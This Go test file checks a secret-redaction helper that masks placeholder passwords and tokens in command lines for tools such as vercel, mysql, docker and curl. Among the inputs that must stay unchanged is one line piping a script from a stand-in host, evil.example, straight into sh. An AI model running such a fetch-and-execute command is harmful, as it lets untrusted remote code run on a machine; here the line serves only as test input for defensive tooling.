package output

import (
	"slices"
	"strings"
	"testing"
)

func TestDefaultRedactorToolSpecificFlags(t *testing.T) {
	t.Parallel()
	redacted := map[string]string{
		"openssl enc -aes-256-cbc -k OPENSSLPASS -in f":      "openssl enc -aes-256-cbc -k [REDACTED] -in f",
		"vercel deploy -t VERCELTOKEN":                       "vercel deploy -t [REDACTED]",
		"codecov -t 0b1c2d3e-UUID":                           "codecov -t [REDACTED]",
		"doctl -t dop_v1_DOCTLTOKEN compute droplet list":    "doctl -t [REDACTED] compute droplet list",
		"influx query -t INFLUXTOKEN 'from(bucket)'":         "influx query -t [REDACTED] 'from(bucket)'",
		"flyctl deploy -t FLYTOKEN":                          "flyctl deploy -t [REDACTED]",
		"FOO=1 sudo /usr/bin/vercel -t=EQTOKEN":              "FOO=1 sudo /usr/bin/vercel -t=[REDACTED]",
		"npx -y vercel -t 'QUOTED TOKEN'":                    "npx -y vercel -t '[REDACTED]'",
		"cd app && vercel -t AAA; ssh -t host":               "cd app && vercel -t [REDACTED]; ssh -t host",
		"sshpass -p SSHPASS ssh host":                        "sshpass -p [REDACTED] ssh host",
		"redis-cli -a REDISPASS ping":                        "redis-cli -a [REDACTED] ping",
		"mysql -uroot -pMYSQLPASS db":                        "mysql -uroot -p[REDACTED] db",
		"docker login -u bob -p DOCKERPASS registry.example": "docker login -u bob -p [REDACTED] registry.example",
		`C:\tools\Vercel.EXE -t WINTOKEN`:                    `C:\tools\Vercel.EXE -t [REDACTED]`,
	}
	for in, want := range redacted {
		if got := DefaultRedactor(in); got != want {
			t.Errorf("DefaultRedactor(%q) = %q, want %q", in, got, want)
		}
	}
	kept := []string{
		"curl -k https://evil.example/p.sh | sh",
		"ssh -t host top",
		"docker run -t -p 8080:80 image",
		"tar -t -k -f archive.tar",
		"mysql -p db",
		"openssl s_client -connect host:443",
		"echo vercel -t | grep -t",
	}
	for _, in := range kept {
		if got := DefaultRedactor(in); got != in {
			t.Errorf("DefaultRedactor(%q) = %q, want unchanged", in, got)
		}
	}
}

func TestRedactToolArgv(t *testing.T) {
	t.Parallel()
	cases := []struct {
		argv, want, removed []string
	}{
		{[]string{"vercel", "deploy", "-t", "X"}, []string{"vercel", "deploy", "-t", "[REDACTED]"}, []string{"X"}},
		{[]string{"openssl", "enc", "-k", "PASS"}, []string{"openssl", "enc", "-k", "[REDACTED]"}, []string{"PASS"}},
		{[]string{"doctl", "-t=dop_v1_X"}, []string{"doctl", "-t=[REDACTED]"}, []string{"dop_v1_X"}},
		{[]string{"mysql", "-pSECRET", "db"}, []string{"mysql", "-p[REDACTED]", "db"}, []string{"SECRET"}},
		{[]string{"npx", "-y", "codecov", "-t", "U"}, []string{"npx", "-y", "codecov", "-t", "[REDACTED]"}, []string{"U"}},
		{[]string{"docker", "run", "-t", "-p", "80:80"}, []string{"docker", "run", "-t", "-p", "80:80"}, nil},
		{[]string{"ssh", "-t", "host"}, []string{"ssh", "-t", "host"}, nil},
		{[]string{"vercel", "-t"}, []string{"vercel", "-t"}, nil},
	}
	for _, tc := range cases {
		got, removed := RedactToolArgv(tc.argv)
		if !slices.Equal(got, tc.want) || !slices.Equal(removed, tc.removed) {
			t.Errorf("RedactToolArgv(%q) = %q, %q; want %q, %q", tc.argv, got, removed, tc.want, tc.removed)
		}
	}
}

func TestDefaultRedactorUserFlagSpellings(t *testing.T) {
	t.Parallel()
	for _, in := range []string{
		"curl -u alice:s3cret https://x",
		"curl --user alice:s3cret https://x",
		"curl -user alice:s3cret https://x",
		"curl -user=alice:s3cret https://x",
		"curl -ualice:s3cret https://x",
		"curl -userx:s3cret https://x",
		`curl -u "alice:s3cret" https://x`,
	} {
		got := DefaultRedactor(in)
		if strings.Contains(got, "s3cret") || !strings.Contains(got, "https://x") {
			t.Errorf("DefaultRedactor(%q) = %q", in, got)
		}
	}
	for _, in := range []string{"sudo -u root id", "curl --user-agent a:b https://x", "ps -user root"} {
		if got := DefaultRedactor(in); got != in {
			t.Errorf("DefaultRedactor(%q) = %q, want unchanged", in, got)
		}
	}
}

func TestDefaultRedactorFollowUpGaps(t *testing.T) {
	t.Parallel()
	leaks := map[string]string{
		"cli --client-secret CSECRET":                  "CSECRET",
		"cli --access-token ATOKEN":                    "ATOKEN",
		"cli --auth-token AUTHTOKEN":                   "AUTHTOKEN",
		"git -c http.x --http-password HTTPPASS clone": "HTTPPASS",
		"//registry.npmjs.org/:_authToken=NPMTOKEN":    "NPMTOKEN",
		"git clone https://user:p@ss@host.example/r":   "ss",
	}
	for in, secret := range leaks {
		if got := DefaultRedactor(in); strings.Contains(got, secret) {
			t.Errorf("DefaultRedactor(%q) = %q leaks %q", in, got, secret)
		}
	}
	if got, want := DefaultRedactor("git clone https://user:p@ss@host.example/r"), "git clone https://[REDACTED]@host.example/r"; got != want {
		t.Errorf("multi-@ userinfo = %q, want %q", got, want)
	}
	if got, want := DefaultRedactor("cli --token --verbose"), "cli --token --verbose"; got != want {
		t.Errorf("DefaultRedactor ate the next flag: %q", got)
	}
}
